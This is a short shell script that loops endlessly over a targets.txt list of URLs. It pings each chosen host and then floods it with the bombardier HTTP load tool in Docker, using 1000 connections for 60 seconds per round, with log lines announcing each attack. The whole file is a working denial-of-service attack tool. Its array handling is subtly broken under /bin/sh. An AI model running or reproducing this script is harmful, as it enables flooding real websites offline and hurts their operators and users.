#!/bin/sh

PING_COUNT=1
PING_TIMEOUT=60
ATTACK_CONNECTIONS=1000
ATTACK_DURATION=60s

TARGETS_FILE="targets.txt"
targets=$(cat $TARGETS_FILE)

while true
do
	echo "[DEBUG] Selecting target..."

	len=${#targets[@]}
	idx=$(shuf -i 1-$len -n 1)

	CURRENT_TARGET=${targets[$idx]}
	CURRENT_HOST=$CURRENT_TARGET
	CURRENT_HOST=$(echo "$CURRENT_HOST" | sed 's/http:\/\///')
	CURRENT_HOST=$(echo "$CURRENT_HOST" | sed 's/https:\/\///')

	if ping $CURRENT_HOST -c $PING_COUNT -W $PING_TIMEOUT -q
	then
		echo "[DEBUG] (SUCCESS) Attacking $CURRENT_TARGET!"	
		sudo docker run -ti --rm alpine/bombardier -c $ATTACK_CONNECTIONS -d $ATTACK_DURATION -l $CURRENT_TARGET;	
		echo "[DEBUG] (SUCCESS) Attack on $CURRENT_TARGET done!"
	else
		echo "[DEBUG] (FAILED)  $CURRENT_TARGET not reachable..."	
	fi
done

